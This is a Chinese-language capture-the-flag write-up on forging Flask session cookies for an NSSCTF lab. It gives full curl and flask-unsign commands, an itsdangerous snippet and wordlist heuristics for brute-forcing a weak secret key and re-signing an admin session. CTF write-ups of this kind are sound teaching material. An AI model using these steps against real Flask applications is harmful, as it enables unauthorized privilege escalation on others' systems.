【Flask的session伪装】平台：NSSCTF(3872)｜难度：☆☆☆｜日期：2026-08-01

## 考点
Flask session cookie 伪造：弱密钥爆破 + 重签名

---

## 一、解题思路链（完整复盘）

```
① /hello 填名字 → 回显 欢迎xx师傅 + 响应头 Set-Cookie（发现会话机制）
② 空手访问 /flag → 500（对比实验：没cookie程序崩 → /flag 依赖 session）
③ 带 cookie 访问 /flag → "只有管理员才能拿flag耶"（权限判断在 session 里）
④ 解码 cookie → {"name":"test"} → 目标：改成 admin
⑤ 直接篡改内容 → 500（签名验不过！）→ 明白：必须重算签名
⑥ 爆破密钥 → LitCTF → 重签名 {"name":"admin"} → flag ✅
```

关键点：⑤"直接篡改失败"的验证证明了签名机制存在，让"爆破密钥"变成必然选择。

---

## 二、解题过程（复现命令）

```bash
# 1. 正常提交拿 cookie（-c 存单）
curl -X POST http://node4.anna.nssctf.cn:20948/hello -d "name=test" -c cookies.txt

# 2. 带 cookie 访问 /flag（-b 带单）→ 只有管理员才能拿flag耶
curl -b cookies.txt http://node4.anna.nssctf.cn:20948/flag

# 3. 解码 cookie → {'name': 'test'}
flask-unsign --decode --cookie "eyJuYW1lIjoidGVzdCJ9.am3ZVQ.o6YIvy0Ta78OuLAzImauh2qgACc"

# 4. 爆破密钥（先试常见弱密钥，见"字典猜词规律"）→ 得到 LitCTF
flask-unsign --unsign --cookie "<合法cookie>" --wordlist wl.txt --no-literal-eval
# [+] Found secret key after 32 attempts → b'LitCTF'

# 5. 用密钥重签名 admin 内容 → 伪造成功
flask-unsign --sign --secret "LitCTF" --cookie "{'name': 'admin'}"

# 6. 带伪造 cookie 访问 /flag
curl http://node4.anna.nssctf.cn:20948/flag -H "Cookie: session=<伪造的cookie>"
```

flag：`NSSCTF{48121a55-5fb2-4dfe-b640-f760ee7d56d6}`
（NSSCTF 每个实例 flag 动态生成，以自己靶机读出的为准）

---

## 三、核心概念：cookie 与 session

### 1. cookie 是什么
- 服务器写给客户端（浏览器/curl）的"存根单"，存着会话信息
- HTTP 是无状态的：服务器不记得你上次的请求 → 靠 cookie 认人
- **"空手访问" = 请求里没有 `Cookie:` 头**；带 cookie = 请求里有 `Cookie: session=...` 这一行
- 浏览器自动存单/带单，curl 手动：`-c` 存单、`-b` 带单、`-H "Cookie: ..."` 直接写

### 2. cookie 和输入的对应
```
输入 ABC123
  → 服务器执行 session['name'] = "ABC123"
  → 序列化 {"name":"ABC123"} → 编码+签名
  → Set-Cookie: session=eyJuYW1lIjoiQUJDMTIz...（原封不动存了你的输入）
  → 下次请求带上 → 服务器读 session['name'] 判断权限
```

### 3. Flask session cookie 结构（三段式）
```
eyJuYW1lIjoiYWRtaW4ifQ . am3Zug . PjYJGuTOKKhrSwdT_ruLqvl1S0E
└────────────┬────────────┘ └─┬──┘ └──────────┬──────────┘
     内容payload(base64JSON)  时间戳      HMAC签名结果
```
- **内容可读**（base64 解码即得），签名只防**篡改**
- ⚠️ 密钥不在 cookie 里！签名是"用密钥算出的指纹"，指纹推不出密钥

---

## 四、签名与重签名原理

### 1. 签名三步（服务器签发 = 我们伪造 = 同一步骤）
```
① 内容 → JSON → base64 编码
② 加时间戳（6字节二进制整数的base64）
③ HMAC-SHA1(密钥, "内容.时间戳") → 得到签名
最终：内容.时间戳.签名
```

### 2. 验证流程
```
服务器拿到 cookie
  → 用自己手里的密钥对"内容.时间戳"重算一遍 HMAC
  → 和 cookie 里的签名对比
  → 一致 → 信任内容；不一致 → 拒绝（500）
```

### 3. 为什么必须爆破密钥
- 修改内容 → 签名必然对不上 → 必须重算签名
- 重算需要密钥 → 密钥在服务器源码里看不到 → 弱密钥爆破
- 爆破验证原理：拿候选密钥**本地重算指纹**，和 cookie 自带签名比对，一致即命中（不需要请求服务器）

### 4. 手搓签名的失败教训（理解价值>成功）
| 尝试 | 失败原因 |
|---|---|
| JSON 带空格 `{"name": "admin"}` | Flask 序列化是紧凑版 `{"name":"admin"}`，签名要求**字节级零误差** |
| 时间戳用十进制字符串 base64 | Flask 时间戳是 6 字节二进制整数的 base64，格式不同 |

→ 实战结论：**别手搓，用库/工具**（flask-unsign 封装了 itsdangerous，细节全包）。

```python
# 原理同款：itsdangerous 库直接生成合法 cookie
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer('LitCTF', salt='cookie-session', signer_kwargs={'key_derivation':'hmac'})
cookie = s.dumps({'name':'admin'})   # 直接得到可用的伪造 cookie
```

---

## 五、弱密钥爆破字典的猜词规律

```
1. 通用弱密码：secret / admin / password / 123456 / test / root
2. 框架名：flask / django / werkzeug
3. 平台名：nssctf / ctf
4. 题目/赛事名：litctf ← 页面标题写了啥就试啥（大小写变体都试）
5. 常见变形：首字母大写、加年份（litctf2023）
```

- 字典来源：自己写的 32 词小字典 / `flask-unsign[wordlist]` 内置几千词（收集自书籍、GitHub、StackOverflow 泄露的密钥）/ rockyou 大字典
- 爆破失败不是死路：换更大的字典，或找源码泄露（.git、备份文件）

---

## 六、Flask 判别特征（识别技术栈）

- 响应头 `Server: Werkzeug/x.x.x Python/x.x.x`
- `Vary: Cookie`、`Set-Cookie: session=...`
- 错误页 Werkzeug 样式（`<!doctype html><html lang=en>`）
- session cookie 恒为 `session=eyJ...`（eyJ = JSON 的 base64 开头）

---

## 七、做题工具链速查

```bash
pip install flask-unsign
flask-unsign --decode --cookie "<cookie>"                 # 解码看内容
flask-unsign --unsign --cookie "<cookie>" --wordlist <字典> --no-literal-eval  # 爆破密钥
flask-unsign --sign --secret "<密钥>" --cookie "{'name':'admin'}"  # 重签名伪造
```

## 常见坑
- 爆破用 `--no-literal-eval`（避免 JSON 被当 Python 表达式解析报错）
- 先试常见弱密钥，字典太大太慢
- 直接篡改 cookie 必失败（签名保护）——这是特征不是 bug
- `HttpOnly` 只防浏览器 JS 读 cookie，不影响手动伪造
